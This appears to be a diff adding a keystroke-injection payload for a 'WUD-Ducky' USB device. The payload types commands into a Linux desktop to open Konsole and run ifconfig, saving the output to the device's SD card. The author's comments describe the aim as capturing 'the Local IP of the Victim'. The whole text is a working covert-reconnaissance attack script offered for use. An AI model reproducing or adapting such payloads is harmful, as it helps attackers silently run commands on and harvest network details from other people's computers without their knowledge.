@@ -1,0 +1,12 @@
+CustomDelay:1000
+Key:227
+CustomDelay:1000
+PrintLine:konsole
+Key:158
+Key:40
+CustomDelay:2000
+Rem: DUKYTO is the name of my SD card that is in the WUD-Ducky, and that is where we place the file that will contain the Local IP of the Victim.
+Rem: You change for the route that you like the most.
+PrintLine:ifconfig > /media/$USER/DUCKYTO/DatosIfconfig.txt
+Key:158
+Key:40
